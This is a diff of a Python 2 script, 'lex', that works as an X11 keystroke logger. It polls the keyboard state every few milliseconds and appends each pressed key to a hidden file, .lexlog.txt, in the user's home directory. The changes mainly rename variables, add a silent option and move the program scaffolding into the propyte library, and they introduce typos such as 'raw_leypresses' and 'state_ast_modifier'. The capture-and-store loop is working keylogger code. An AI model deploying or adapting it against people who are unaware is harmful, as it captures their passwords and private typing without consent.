@@ -42,14 +42,16 @@ Usage:
     lex.py [options]
 
 Options:
-    -h, --help                display help message
-    --version                 display version and exit
-    -v, --verbose             verbose logging
-    -u, --username=USERNAME   username
+    -h, --help               display help message
+    --version                display version and exit
+    -v, --verbose            verbose logging
+    -s, --silent             silent
+    -u, --username=USERNAME  username
 """
 
 name    = "lex"
-version = "2015-09-23T1304Z"
+version = "2016-02-20T0918Z"
+logo    = None
 
 import os
 import sys
@@ -58,12 +60,22 @@ import ctypes
 import ctypes.util
 import docopt
 import shijian
+import propyte
 import pyprel
 
 def main(options):
 
     global program
-    program = Program(options = options)
+    program = propyte.Program(
+        options = options,
+        name    = name,
+        version = version,
+        logo    = logo
+        )
+    global log
+    from propyte import log
+
+    log.info("")
 
     keyboard = Keyboard()
     keyboard.log_loop()
@@ -76,14 +88,14 @@ class Keyboard:
         ):
         # X11 interface
         self.X11 = ctypes.cdll.LoadLibrary(ctypes.util.find_library("X11"))
-        self.displayX11 = self.X11.XOpenDisplay(None)
+        self.display_X11 = self.X11.XOpenDisplay(None)
         # keyboard
         # Store the keyboard state, which is characterised by 32 bytes, with
         # each bit representing the state of a single key.
-        self.keyboardState = (ctypes.c_char * 32)()
-        self.stateCapsLock = 0
+        self.keyboard_state = (ctypes.c_char * 32)()
+        self.state_caps_lock = 0
         # Define special keys (byte, byte value).
-        self.shiftKeys = ((6, 4), (7, 64))
+        self.shift_keys = ((6, 4), (7, 64))
         self.modifiers = {
             "left shift":  (6,   4),
             "right shift": (7,  64),
@@ -92,11 +104,11 @@ class Keyboard:
             "left alt":    (8,   1),
             "right alt":   (13, 16)
         }
-        self.lastPressed         = set()
-        self.lastPressedAdjusted = set()
-        self.stateLastModifier   = {}
+        self.last_pressed          = set()
+        self.last_pressed_adjusted = set()
+        self.state_ast_modifier    = {}
         # Define a dictionary of key byte numbers and key values.
-        self.keyMapping = {
+        self.key_mapping = {
             1: {
                 0b00000010: "<esc>",
                 0b00000100: ("1", "!"),
@@ -197,24 +209,24 @@ class Keyboard:
         # The function XQueryKeymap returns a bit vector for the logical state
         # of the keyboard for each bit set to 1 indicates that the corresponding
         # key is pressed down currently. The vector is represented by 32 bytes.
-        self.X11.XQueryKeymap(self.displayX11, self.keyboardState)
-        rawKeypresses = self.keyboardState
+        self.X11.XQueryKeymap(self.display_X11, self.keyboard_state)
+        raw_leypresses = self.keyboard_state
         # Check the states of key modifiers (Ctrl, Alt, Shift).
-        stateModifier = {}
+        state_modifier = {}
         for modifier, (i, byte) in self.modifiers.iteritems():
-            stateModifier[modifier] = bool(ord(rawKeypresses[i]) & byte)
+            state_modifier[modifier] = bool(ord(raw_leypresses[i]) & byte)
         # Detect Shift.
         shift = 0
-        for i, byte in self.shiftKeys:
-            if ord(rawKeypresses[i]) & byte:
+        for i, byte in self.shift_keys:
+            if ord(raw_leypresses[i]) & byte:
                 shift = 1
                 break
         # Detect Caps Lock.
-        if ord(rawKeypresses[8]) & 4:
-            self.stateCapsLock = int(not self.stateCapsLock)
+        if ord(raw_leypresses[8]) & 4:
+            self.state_caps_lock = int(not self.state_caps_lock)
         # Aggregate pressed keys.
-        pressedKeys = []
-        for i, k in enumerate(rawKeypresses):
+        pressed_keys = []
+        for i, k in enumerate(raw_leypresses):
             o = ord(k)
             if o:
                 time.sleep(0.1)
@@ -222,24 +234,24 @@ class Keyboard:
                 #    i = i,
                 #    o = o
                 #))
-                for byte, key in self.keyMapping.get(i, {}).iteritems():
+                for byte, key in self.key_mapping.get(i, {}).iteritems():
                     if byte & o:
                         if isinstance(key, tuple):
-                            key = key[shift or self.stateCapsLock]
-                        pressedKeys.append(key)
-        tmp = pressedKeys
-        pressedKeys = list(set(pressedKeys).difference(self.lastPressed))
-        stateChanged = tmp != self.lastPressed and (pressedKeys or self.lastPressedAdjusted)
-        self.lastPressed = tmp
-        self.lastPressedAdjusted = pressedKeys
-        if pressedKeys:
-            pressedKeys = pressedKeys[0]
+                            key = key[shift or self.state_caps_lock]
+                        pressed_keys.append(key)
+        tmp = pressed_keys
+        pressed_keys = list(set(pressed_keys).difference(self.last_pressed))
+        state_changed = tmp != self.last_pressed and (pressed_keys or self.last_pressed_adjusted)
+        self.last_pressed = tmp
+        self.last_pressed_adjusted = pressed_keys
+        if pressed_keys:
+            pressed_keys = pressed_keys[0]
         else:
-            pressedKeys = None
-        stateChanged = self.stateLastModifier and (stateChanged or stateModifier != self.stateLastModifier)
-        self.stateLastModifier = stateModifier
-        # stateChanged: Boolean
-        # stateModifier: dictionary of status of available modifiers, e.g.:
+            pressed_keys = None
+        state_changed = self.state_ast_modifier and (state_changed or state_modifier != self.state_ast_modifier)
+        self.state_ast_modifier = state_modifier
+        # state_changed: Boolean
+        # state_modifier: dictionary of status of available modifiers, e.g.:
         # {
         #     'left shift':  True,
         #     'right alt':   False,
@@ -248,120 +260,28 @@ class Keyboard:
         #     'left ctrl':   False,
         #     'right ctrl':  False
         # }
-        # pressedKeys: string of key detected, e.g. e.
-        return (stateChanged, stateModifier, pressedKeys)
+        # pressed_keys: string of key detected, e.g. e.
+        return (state_changed, state_modifier, pressed_keys)
 
     def log_loop(self):
 
-        logFilename = "/home/{userName}/.lexlog.txt".format(
-            userName = program.userName
+        log_filename = "/home/{username}/.lexlog.txt".format(
+            username = program.username
         )
         
         while True:
             time.sleep(0.005)
-            stateChanged, stateModifier, pressedKeys = self.access_keys()
-            if stateChanged and pressedKeys is not None:
+            state_changed, state_modifier, pressed_keys = self.access_keys()
+            if state_changed and pressed_keys is not None:
                 #log.info("detected keystroke: {key}".format(
-                #    key = pressedKeys
+                #    key = pressed_keys
                 #))
-                #print(pressedKeys, end = "")
-                print pressedKeys,
-                with open(logFilename, "a") as logFile:
-                    logFile.write(pressedKeys)
+                #print(pressed_keys, end = "")
+                print pressed_keys,
+                with open(log_filename, "a") as logFile:
+                    logFile.write(pressed_keys)
 
-class Program(object):
 
-    def __init__(
-        self,
-        parent  = None,
-        options = None
-        ):
-
-        # internal options
-        self.displayLogo           = True
-
-        # clock
-        global clock
-        clock = shijian.Clock(name = "program run time")
-
-        # name, version, logo
-        if "name" in globals():
-            self.name              = name
-        else:
-            self.name              = None
-        if "version" in globals():
-            self.version           = version
-        else:
-            self.version           = None
-        if "logo" in globals():
-            self.logo              = logo
-        elif "logo" not in globals() and hasattr(self, "name"):
-            self.logo              = pyprel.renderBanner(
-                                         text = self.name.upper()
-                                     )
-        else:
-            self.displayLogo       = False
-            self.logo              = None
-
-        # options
-        self.options               = options
-        self.userName              = self.options["--username"]
-        self.verbose               = self.options["--verbose"]
-
-        # default values
-        if self.userName is None:
-            self.userName = os.getenv("USER")
-
-        # logging
-        global log
-        log = logging.getLogger(__name__)
-        logging.root.addHandler(technicolor.ColorisingStreamHandler())
-
-        # logging level
-        if self.verbose:
-            logging.root.setLevel(logging.DEBUG)
-        else:
-            logging.root.setLevel(logging.INFO)
-
-        self.engage()
-
-    def engage(
-        self
-        ):
-        pyprel.printLine()
-        # logo
-        if self.displayLogo:
-            log.info(pyprel.centerString(text = self.logo))
-            pyprel.printLine()
-        # engage alert
-        if self.name:
-            log.info("initiate {name}".format(
-                name = self.name
-            ))
-        # version
-        if self.version:
-            log.info("version: {version}".format(
-                version = self.version
-            ))
-        log.info("initiation time: {time}".format(
-            time = clock.startTime()
-        ))
-
-    def terminate(
-        self
-        ):
-        clock.stop()
-        log.info("termination time: {time}".format(
-            time = clock.stopTime()
-        ))
-        log.info("time statistics report:\n{report}".format(
-            report = shijian.clocks.report()
-        ))
-        log.info("terminate {name}".format(
-            name = self.name
-        ))
-        pyprel.printLine()
-        sys.exit()
 
 if __name__ == "__main__":
     options = docopt.docopt(__doc__)
